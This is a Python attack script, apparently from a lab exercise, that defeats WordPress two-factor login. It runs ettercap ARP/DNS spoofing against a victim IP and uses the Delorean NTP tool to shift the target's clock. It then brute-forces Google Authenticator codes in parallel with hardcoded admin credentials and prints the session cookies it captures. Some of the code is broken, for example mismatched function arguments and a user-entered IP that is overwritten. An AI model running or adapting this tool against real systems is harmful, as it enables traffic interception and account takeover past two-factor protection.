#!/usr/bin/python
from multiprocessing import Pool

import typer
from requests import Session
from rich.console import Console
import subprocess
import pexpect
from datetime import datetime
import shlex
from termcolor import colored
from pyfiglet import Figlet

console = Console()
app = typer.Typer()
session = Session()


def banner():
    f = Figlet(font='standard')
    print(colored(f.renderText('WP-LogCrack'), 'green', attrs=["bold"]))


def login(server, code):
    headers = {'User-Agent': "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:105.0) Gecko/20100101 Firefox/105.0"}
    code = code
    response = session.post(f"{server}", headers=headers, data={
        "log": "admin",
        "pwd": "ubuntu",
        "googleotp": str(code).zfill(6),
        'rememberme': 'forever'
    }, allow_redirects=False, verify=False)

    if response.status_code == 302:
        result = {
            'token': code,
            'cookies': response.cookies.get_dict()
        }
        print(result)


def bruteforce(server, start, end):
    for code in range(start, end):
        print("code " + str(code))
        login(server, code)


def get_timestamp():
    data = datetime.today()
    minute = data.minute
    minute = (minute + 2) % 60
    if minute < 10:
        minute = "0" + str(minute)
    timestamp = data.strftime('%Y-%m-%d %H:' + str(minute))

    return timestamp


def ettercap(timestamp, server, username, password):
    ip = input("Victim IP: ")
    ip = "192.168.43.210"
    cmd = "sudo ettercap -T -M arp /" + ip + "// -P dns_spoof"
    p = pexpect.spawn(cmd, timeout=None)

    while not p.eof():
        str_line = str(p.readline())
        if "UDP  " + ip + ":" in str_line:
            print(str_line)
            delorean(timestamp, server)


def delorean(timestamp, server, username, password):
    print("Delorean Starting")
    cmd = "python3 Delorean-master/delorean.py -d \"" + timestamp + "\""
    p = pexpect.spawn(cmd, timeout=None)

    if not p.eof():
        print("Delorean Started")

    while not p.eof():
        str_line = str(p.readline())
        if "Sent to" in str_line:
            print(str_line)
            hour = (str_line[len(str_line) - 10: len(str_line) - 8])
            time = datetime.strptime(timestamp, '%Y-%m-%d %H:%M')
            time = time.replace(hour=int(hour))
            time = str(time.strftime('%Y-%m-%d %H:%M'))
            wpbiff(time, server, username, password)


def wpbiff(timestamp, server, username, password):

    server = "http://192.168.43.210/wordpress/wp-login.php"

    pool = Pool()
    result1 = pool.apply_async(bruteforce, [server, 0, 333333])
    result2 = pool.apply_async(bruteforce, [server, 333331, 666666])
    result3 = pool.apply_async(bruteforce, [server, 666661, 999999])
    answer1 = result1.get(timeout=None)
    answer2 = result2.get(timeout=None)
    answer3 = result3.get(timeout=None)


'''
    server = "http://192.168.43.210/wordpress/wp-login.php"

    username = "admin"
    password = "ubuntu"
    command_wp_biff1 = "sudo wpbiff -t 000000 -m 333333 -u " + username + " -p " + password + " --plugin ga -d \"" + timestamp + "\" \"" + server + "\""
    command_wp_biff2 = "sudo wpbiff -t 333331 -m 666666 -u " + username + " -p " + password + " --plugin ga -d \"" + timestamp + "\" \"" + server + "\""
    command_wp_biff3 = "sudo wpbiff -t 666661 -m 999999 -u " + username + " -p " + password + " --plugin ga -d \"" + timestamp + "\" \"" + server + "\""

    p1 = subprocess.Popen(shlex.split(command_wp_biff1), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    p2 = subprocess.Popen(shlex.split(command_wp_biff2), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    p3 = subprocess.Popen(shlex.split(command_wp_biff3), stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    while True:
        output1 = p1.stderr.read1().strip().decode("utf8")
        output2 = p2.stderr.read1().strip().decode("utf8")
        output3 = p3.stderr.read1().strip().decode("utf8")

        if (output1 == '' and p1.poll() is not None) and \
                (output2 == '' and p2.poll() is not None) and \
                (output3 == '' and p3.poll() is not None) :
            break

        if output1:
            print(output1)
            if "100%" in output1:
                print(p1.stdout.read().strip().decode("utf8").split("Great Success!")[1])
                break
        if output2:
            print(output2)
            if "100%" in output2:
                print(p2.stdout.read().strip().decode("utf8").split("Great Success!")[1])
                break
        if output3:
            print(output3)
            if "100%" in output3:
                print(p3.stdout.read().strip().decode("utf8").split("Great Success!")[1])
                break

    p1.poll()
    p2.poll()
    p3.poll()
'''


@app.callback()
def main(
        server: str = typer.Option(
            ...,
            prompt=True,
            envvar="SERVER",
            help=f"Vulnerable server ID"
        ),
        username: str = typer.Option(
            ...,
            prompt=True,
            help=f"WordPress username"
        ),
        password: str = typer.Option(
            ...,
            prompt=True,
            help=f"WordPress password"
        ),
        dns_spoof: bool = typer.Option(
            default=True,
            prompt=True,
            help=f"DNS spoofing attack"
        )):
    banner()
    with console.status("Getting timestamp to use for the Attack"):
        timestamp = get_timestamp()
        print("The timestamp is " + timestamp)

    if dns_spoof:
        ettercap(timestamp, server, username, password)
    else:
        delorean(timestamp, server, username, password)


def run():
    try:
        typer.run(main)
    except Exception as e:
        console.print(f"[red bold]Error:[/red bold] {e}")


if __name__ == "__main__":
    run()
